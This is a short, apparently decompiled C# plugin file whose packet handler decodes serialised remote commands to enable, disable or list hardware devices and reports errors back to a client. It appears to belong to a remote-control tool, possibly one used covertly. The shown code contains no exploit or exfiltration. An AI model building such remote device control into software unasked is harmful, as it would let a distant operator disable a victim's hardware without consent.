using System;
using Leb128;
using Plugin.Helper;

namespace Plugin;

internal class Packet
{
	public static void Read(byte[] data)
	{
		try
		{
			object[] array = LEB128.Read(data);
			switch ((string)array[0])
			{
			case "Enable":
				DeviceManager.Enable((string)array[1]);
				break;
			case "Disable":
				DeviceManager.Disable((string)array[1]);
				break;
			case "Refresh":
				DeviceManager.Get();
				break;
			}
		}
		catch (Exception ex)
		{
			Client.Send(LEB128.Write(new object[3] { "DeviceManager", "Error", ex.Message }));
			Client.Error(ex.ToString());
		}
	}
}
